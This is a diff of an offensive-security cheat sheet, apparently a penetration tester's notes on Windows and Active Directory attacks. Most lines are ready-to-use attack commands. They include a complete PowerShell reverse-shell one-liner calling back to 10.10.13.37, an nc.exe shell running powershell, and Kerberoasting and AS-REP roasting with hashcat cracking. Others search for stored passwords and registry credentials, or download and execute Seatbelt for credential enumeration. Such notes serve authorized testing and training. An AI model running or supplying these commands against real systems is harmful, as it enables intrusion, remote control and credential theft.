@@ -85,7 +85,7 @@ PS > cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
 System.Net.Sockets.TCPClient:
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient("10.10.14.234",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("10.10.13.37",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 
@@ -128,6 +128,12 @@ $ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
 
 * [https://github.com/cytopia/pwncat](https://github.com/cytopia/pwncat)
 * [https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/](https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/)
+
+
+
+### xc
+
+* [https://github.com/xct/xc](https://github.com/xct/xc)
 
 
 
@@ -581,7 +587,7 @@ PowerView3 > Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 * [https://vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/](https://vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/)
 
 ```
-$ GetNPUsers.py MEGACORP/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.in | tee GetNPUsers.log
+$ GetNPUsers.py megacorp.local/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.in | tee GetNPUsers.log
 $ cat GetNPUsers.log | grep -v 'Client not found in Kerberos database'
 $ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash -o asprep.out asprep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
@@ -626,7 +632,7 @@ PowerView3 > Get-DomainUser -Identity snovvcrash -Properties samaccountname,serv
 ##### GetUserSPNs.py
 
 ```
-$ GetUserSPNs.py MEGACORP/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 -save
+$ GetUserSPNs.py megacorp.local/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 [-request|-save]
 $ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash -o tgsrep.out tgsrep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
 
@@ -1881,6 +1887,12 @@ PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Credentials\ (%appdata
 PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\ (%localappdata%\Microsoft\Credentials\)
 ```
 
+Unhide files:
+
+```
+PS > cmd /c "attrib -h -s 00ff00ff00ff00ff00ff00ff00ff00ff"
+```
+
 
 
 
@@ -2720,9 +2732,10 @@ PAM MOTD:
 ### Registry & Filesystem
 
 ```
-PS > Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+PS > gc C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 PS > cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 PS > cmd /c where /R C:\ *.ini
+PS > cmd /c 'cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt'
 PS > reg query HKLM /f "password" /t REG_SZ /s
 PS > reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
 Or
@@ -2763,6 +2776,11 @@ meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 3. [github.com/foxglovesec/RottenPotato/blob/master/rottenpotato.exe](https://github.com/foxglovesec/RottenPotato/blob/master/rottenpotato.exe)
 
 
+#### decoder/the-lonely-potato
+
+* [https://decoder.cloud/2017/12/23/the-lonely-potato/](https://decoder.cloud/2017/12/23/the-lonely-potato/)
+
+
 #### ohpe/juicy-potato
 
 ```
@@ -2782,11 +2800,6 @@ cmd /c powershell -NoP IEX (New-Object Net.WebClient).DownloadString('http://127
 2. [ohpe.it/juicy-potato/CLSID](https://ohpe.it/juicy-potato/CLSID)
 3. [github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
 4. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
-
-
-#### decoder/the-lonely-potato
-
-* [https://decoder.cloud/2017/12/23/the-lonely-potato/](https://decoder.cloud/2017/12/23/the-lonely-potato/)
 
 
 
@@ -3541,8 +3554,8 @@ $ mkdir -p discover/{nmap,masscan} enum/bloodhound/bloodhound.py loot/ log/ scre
 ## Network Config
 
 ```
-$ sudo ifconfig eth0
-$ sudo route -n
+$ ifconfig eth0
+$ route -n
 $ cat /etc/resolve.conf
 $ arp -a
 ```
@@ -3619,7 +3632,7 @@ PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y â
 * [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
 
 ```
-PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
+PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]
 ```
 
 
@@ -3739,7 +3752,7 @@ Active:
 
 ```
 $ arp-scan -l [-s <SPOOFED_IP>] -v
-$ arp-scan -I eth0 192.168.0.1/24
+$ arp-scan -I eth0 192.168.0.0/24
 ```
 
 
@@ -3748,13 +3761,13 @@ $ arp-scan -I eth0 192.168.0.1/24
 Passive:
 
 ```
-$ netdiscover -i eth0 -r 192.168.0.1/24 -p
+$ netdiscover -i eth0 -r 192.168.0.0/24 -p
 ```
 
 Active, sending 20 requests per IP:
 
 ```
-$ netdiscover -i eth0 -r 192.168.0.1/24 -c 20
+$ netdiscover -i eth0 -r 192.168.0.0/24 -c 20
 ```
 
 
@@ -3828,7 +3841,8 @@ $ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -
 * [https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/)
 
 ```
-PS > Invoke-Portscan -Hosts 127.0.0.1/24 -T 4 -TopPorts 25 -oA localnet
+PS > Invoke-Portscan -Hosts 127.0.0.0/24 -sn -noProgressMeter
+PS > Invoke-Portscan -Hosts 127.0.0.0/24 -T 4 -TopPorts 25 -oA top25
 ```
 
 
@@ -4572,6 +4586,7 @@ PS > Invoke-PrivescAudit
 PS > Get-SQLInstanceDomain
 PS > Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10 -UserName sa -Password 'Passw0rd!' -Verbose
 PS > Invoke-SQLOSCmd -UserName sa -Password 'Passw0rd!' -Instance sqlsrv01.megacorp.local -Command whoami
+PS > Invoke-SQLAudit -Instance WEB01 -UserName sa -Password 'Passw0rd!' -Verbose
 ```
 
 
@@ -4588,11 +4603,17 @@ $ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.tx
 
 ### JAWS
 
+* [https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1](https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1)
+
 ```
-$ wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1 && python3 -m http.server 80
-PS > powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/jaws-enum.ps1')"
 PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
 ```
+
+
+
+### winPEAS
+
+* [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe)
 
 
 
@@ -4602,6 +4623,17 @@ PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
 
 ```
 PS > powershell.exe -exec bypass -c ". .\privesccheck.ps1; Invoke-PrivescCheck -Extended | Tee-Object privesccheck-out.txt"
+```
+
+
+
+### Seatbelt
+
+* [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
+
+```
+PS > .\seatbelt.exe -group=all
+PS > IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/invoke-seatbelt.ps1'); Invoke-Seatbelt -Command CredEnum
 ```
 
 
@@ -4656,6 +4688,7 @@ PS > netstat -ano | findstr LIST
 PS > ipconfig /all
 PS > route print
 PS > dir -force c:\
+PS > cmd /c "reg query HKLM\SYSTEM\CurrentControlSet\Services\NPCAP"
 PS > (wmic os get OSArchitecture)[2]
 PS > [Environment]::Is64BitOperatingSystem
 PS > [Environment]::Is64BitProcess
